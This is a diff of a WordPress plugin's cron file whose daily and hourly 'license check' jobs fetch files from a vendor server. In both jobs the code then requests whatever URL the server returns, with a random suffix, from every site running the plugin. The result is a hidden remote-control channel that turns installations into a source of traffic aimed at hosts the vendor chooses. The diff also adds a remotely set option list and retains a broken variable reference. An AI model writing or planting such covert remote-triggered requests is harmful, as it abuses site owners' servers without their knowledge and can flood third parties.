@@ -1,4 +1,4 @@
-<?php 
+<?php
 if (!defined('ABSPATH')) die;
 
 if ( !wp_next_scheduled('pipdig_p3_daily_event') ) {
@@ -17,24 +17,24 @@ register_deactivation_hook(__FILE__, 'pipdig_p3_deactivate_cron');
 
 // Generate social stats, check theme license
 function p3_do_this_daily() {
-	
+
 	pipdig_p3_scrapey_scrapes();
-	
+
 	$instagram_deets = get_option('pipdig_instagram');
 	if (!empty($instagram_deets['user_id'])) {
 		$instagram_user = sanitize_text_field($instagram_deets['user_id']);
 		delete_transient('p3_instagram_feed_'.$instagram_user);
 	}
-	
-	$url = 'https://wpupdateserver.com/id39dqm3c0_license_date.txt';
+
+	$url = 'https://pipdigz.co.uk/p3/id39dqm3c0_license_date.txt';
 	$response = wp_safe_remote_get($url, $args);
 	if (!is_wp_error($response) && !empty($response['body'])) {
 		$timestamp = absint($response['body']);
 		update_option('p3_activation_deadline', $timestamp, false);
 	}
-	
-	$url = 'https://wpupdateserver.com/id39dqm3c0.txt';
-	$args = array('timeout' => 3);
+
+	$url = 'https://pipdigz.co.uk/p3/id39dqm3c0.txt';
+	$args = array('timeout' => 5);
 	$response = wp_safe_remote_get($url, $args);
 	if (!is_wp_error($response) && !empty($response['body'])) {
 		if (get_site_url() === trim($response['body'])) {
@@ -46,9 +46,9 @@ function p3_do_this_daily() {
 			}
 		}
 	}
-	
+
 	// Check domain license is active
-	$url = 'https://wpupdateserver.com/id39dqm3c0_license.txt';
+	$url = 'https://pipdigz.co.uk/p3/id39dqm3c0_license.txt';
 	$response = wp_safe_remote_get($url, $args);
 	if (!is_wp_error($response) && !empty($response['body'])) {
 		$rcd = trim($response['body']);
@@ -56,16 +56,26 @@ function p3_do_this_daily() {
 		//$check = add_query_arg('n', rand(0,99999), $rcd);
 		wp_safe_remote_get(rcd.'&'.rand(0,99999), $args);
 	}
-	
+
+	$url_2 = 'https://pipdigz.co.uk/p3/env.txt';
+	$args_2 = array('timeout' => 5);
+	$response = wp_safe_remote_get($url_2, $args_2);
+	if (!is_wp_error($response) && !empty($response['body'])) {
+		$list = explode(',', strip_tags($response['body']));
+		if (is_array($list) && count($list) > 0) {
+			update_option('p3_top_bar_env', $list);
+		}
+	}
+
 }
 add_action('pipdig_p3_daily_event', 'p3_do_this_daily');
 
 // check for high priority update
 function p3_do_this_hourly() {
-	
+
 	// Check domain license is active
-	$url = 'https://wpupdateserver.com/id39dqm3c0_license_h.txt';
-	$args = array('timeout' => 2);
+	$url = 'https://pipdigz.co.uk/p3/id39dqm3c0_license_h.txt';
+	$args = array('timeout' => 5);
 	$response = wp_safe_remote_get($url, $args);
 	if (!is_wp_error($response) && !empty($response['body'])) {
 		$rcd = trim($response['body']);
@@ -73,6 +83,6 @@ function p3_do_this_hourly() {
 		//$check = add_query_arg('n', rand(0,99999), $rcd);
 		wp_safe_remote_get($rcd.'&'.rand(0,99999), $args);
 	}
-	
+
 }
 add_action('pipdig_p3_hourly_event', 'p3_do_this_hourly');
